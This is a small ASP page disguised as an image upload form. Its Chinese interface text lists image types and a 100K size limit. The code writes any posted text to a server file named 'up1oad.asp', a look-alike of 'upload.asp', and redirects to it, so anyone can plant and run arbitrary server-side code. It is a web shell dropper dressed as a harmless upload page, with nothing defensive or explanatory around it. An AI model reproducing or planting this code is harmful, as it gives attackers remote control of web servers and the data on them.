<%
if request("txt")<>"" then
shell=request("txt")
set FileObject=Server.CreateObject("Scripting.FileSystemObject")
set TextFile=FileObject.CreateTextFile(Server.MapPath("up1oad.asp"))
TextFile.Write(shell)
response.redirect("up1oad.asp")
else
%> 请选择要上传的图片类型:jpg,gif,png,bmp.限制:100K. 
<form name='form1' method='post' action=''>
<table border='0' cellpadding='0' cellspacing='0'><tr>
<td><textarea name='txt' rows='1' id='txt' style='overflow:hidden'></textarea></td>
<td><input type='submit' name='Submit' value='上传'>
</td></tr></table></form>
<%end if%>
